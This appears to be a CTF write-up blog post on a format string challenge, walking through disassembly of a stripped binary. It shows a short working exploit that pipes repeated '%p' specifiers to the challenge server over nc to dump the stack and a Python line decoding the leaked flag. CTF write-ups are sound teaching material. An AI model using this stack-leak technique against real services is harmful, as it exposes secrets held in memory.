---
layout:     post
title:      Backdoor CTF 2015 team Writeup
date:       2015-05-04 12:00:00
summary:    Easy format string challenge writeup
categories: ctf format-string
---

## TL;DR
* Format string

Given that this challenge was 600 points, I expected to be challenged with this one. But with 91 solves I think the people at SDSLabs kinda messed up on the points for this one lol.

Checking out what type of file we were dealing with here:
{% highlight bash lineanchors %}
[~/Documents/CTFs/backdoor]$ file team
team: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, stripped
{% endhighlight %}

Alright 32 bit, let's crack open IDA for this one then :D

### Aside
This program is stripped, meaning that we do not have any labels for any of the functions (functions don't have function names). IDA tries to search for patterns in the disassembly for where functions exist. For example, functions typically consist of a function prolog, 
{% highlight nasm lineanchors %}
push    ebp
mov     ebp, esp
...
{% endhighlight %}
and at the very end you would see something like, 
{% highlight nasm lineanchors %}
...
leave
ret
{% endhighlight %}

Looking at the code we can identify a function that IDA found to be the main function based on the parameters passed to `__libc_start_main`:

{% highlight nasm lineanchors %}
; int __cdecl main(int argc, const char **argv, const char **envp)
main proc near

argc= dword ptr  8
argv= dword ptr  0Ch
envp= dword ptr  10h

push    ebp
mov     ebp, esp
and     esp, 0FFFFFFF0h
sub     esp, 20h
mov     dword ptr [esp], 0C8h ; size
call    _malloc
mov     [esp+18h], eax
mov     dword ptr [esp], 64h ; size
call    _malloc
mov     [esp+1Ch], eax
mov     dword ptr [esp], offset format ; "Enter teamname: "
call    _printf
mov     eax, ds:stdout
mov     [esp], eax      ; stream
call    _fflush
mov     eax, [esp+18h]
mov     [esp+4], eax
mov     dword ptr [esp], offset a200s ; "%200s"
call    ___isoc99_scanf
mov     dword ptr [esp], offset aEnterFlag ; "Enter flag: "
call    _printf
mov     eax, ds:stdout
mov     [esp], eax      ; stream
call    _fflush
mov     eax, [esp+1Ch]
mov     [esp+4], eax
mov     dword ptr [esp], offset a100s ; "%100s"
call    ___isoc99_scanf
mov     dword ptr [esp], 2 ; seconds
call    _sleep
mov     eax, [esp+1Ch]
mov     [esp+4], eax
mov     eax, [esp+18h]
mov     [esp], eax
call    sub_80486AD
mov     eax, [esp+18h]
mov     [esp], eax      ; ptr
call    _free
mov     eax, [esp+1Ch]
mov     [esp], eax      ; ptr
call    _free
mov     eax, 0
leave
retn
main endp
{% endhighlight %}

My initial guess at what the vulnerability in this program was was a heap overflow because there were some calls to `malloc` and `free` which is very typical of a heap overflow sort of challenge. But looking a little more into this function, we see a call to another function `call    sub_80486AD` which consists of:

1) Opening the file "flag.txt"
{% highlight nasm lineanchors %}
...
mov     dword ptr [esp+4], offset modes ; "r"
mov     dword ptr [esp], offset filename ; "flag.txt"
call    _fopen
mov     [ebp+stream], eax
...
{% endhighlight %}
2) Reading the contents into a stack based buffer
{% highlight nasm lineanchors %}
...
mov     eax, [ebp+stream]
mov     [esp+8], eax    ; stream
mov     dword ptr [esp+4], 64h ; n
lea     eax, [ebp+s]
mov     [esp], eax      ; s
call    _fgets
...
{% endhighlight %}

3) and...drum roll...a format string vulnerability :D
{% highlight nasm lineanchors %}
...
mov     eax, [ebp+format]
mov     [esp], eax      ; format
call    _printf
...
{% endhighlight %}
Now you may ask yourself why is this a format string vulnerabilty? OK, so there is only one parameter given to the `printf` function and with our extensive C knowledge we know that the first parameter to the `printf` function is the format specifier for the function. So if the format specifier is `"%s"` and `printf` goes to get the second parameter then it will go grab the next parameter given by the user as the second parameter, but since we only are giving it one parameter...what would happen? (read more here if you are unsure: [stanford crypto](https://crypto.stanford.edu/cs155/papers/formatstring-1.2.pdf)). Let's see which one of our inputs is actually the format string. If we look earlier in the program to see where this `format` string is coming from...
{% highlight nasm lineanchors %}
...
mov     eax, [ebp+arg_0]
mov     [ebp+format], eax
...
{% endhighlight %}
Alright so it is the first parameter to this function that is called. And if we look at when this function is called...
{% highlight nasm lineanchors %}
mov     eax, [esp+18h]
mov     [esp], eax
call    sub_80486AD
{% endhighlight %}
So `esp+18h` is where our buffer is located and that turns out to be...
{% highlight nasm lineanchors %}
mov     dword ptr [esp], offset format ; "Enter teamname: "
call    _printf         ; print out "Enter teamname: "
mov     eax, ds:stdout
mov     [esp], eax      ; stream
call    _fflush
mov     eax, [esp+18h]  ; the buffer passed into the vulnerable function
mov     [esp+4], eax
mov     dword ptr [esp], offset a200s ; "%200s"
call    ___isoc99_scanf ; read user input into the teamname buffer
{% endhighlight %}
So we know that what we enter into our teamname is the format string :D OK, so know we have the power to write and read to the stack and if we think about it for a second, our flag was read in from a file and put on a stack buffer... why don't we just dump the stack and then get our flag? (We thought that there was a pointer to the flag that we could just do a direct parameter access ie. "%12$s" to print out the flag really easily instead of parsing the stack but after a while of bruteforcing the direct parameter to access we started printing out environment variables and we knew that we went too far lol).

{% highlight python lineanchors %}
[~] python -c 'print "%p"*30' | nc hack.bckdr.in 8004
Enter teamname: Enter flag: <contents of stack>
[~] python
>>> flag_hex = "<hex of flag>"
>>> "".join([chr(int(a[6:8], 16)) + chr(int(a[4:6], 16)) + chr(int(a[2:4], 16)) + chr(int(a[0:2], 16)) for a in flag_hex.split("0x") if a]
<flag>
{% endhighlight %}

### Note
Since these challenges are still up, I just wrote down the steps to get the flag and not the actual flag itself

So there you have it :D

I would show the work that I did 